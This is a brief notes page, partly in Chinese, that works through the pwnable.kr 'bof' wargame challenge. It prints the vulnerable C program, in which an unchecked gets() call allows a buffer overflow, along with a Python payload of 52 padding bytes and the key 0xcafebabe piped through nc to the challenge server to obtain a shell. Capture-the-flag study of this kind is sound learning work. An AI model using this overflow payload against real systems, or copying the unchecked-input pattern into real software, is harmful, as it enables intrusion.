---
layout: default
title: pwnable_bof
parent: pentrue-test
nav_order: 1
---

# pwnable bof
Source :
- [pwnable.kr](http://pwnable.kr/play.php)
---
## fuzzy 模糊字串產生方便debug
```python
import string
import random
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
```
 
# 執行結果
id_generator()
>'G5G74W'

id_generator(3, "6793YUIO")
>'Y3U'

### 程式原始碼

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
-  smash me!
-  if(key == 0xcafebabe)......
-  觀察key的位址直接修改

---
## solution

```python
#debug 
python -c "print 'A'*52+'\xbe\xba\xfe\xca'" > input.txt
#gdb
r < input.txt
#nc pwnable.kr 9000
#keep stding with python 
cat <(python -c "print 'A'*52+'\xbe\xba\xfe\xca'") - | nc pwnable.kr 9000
```




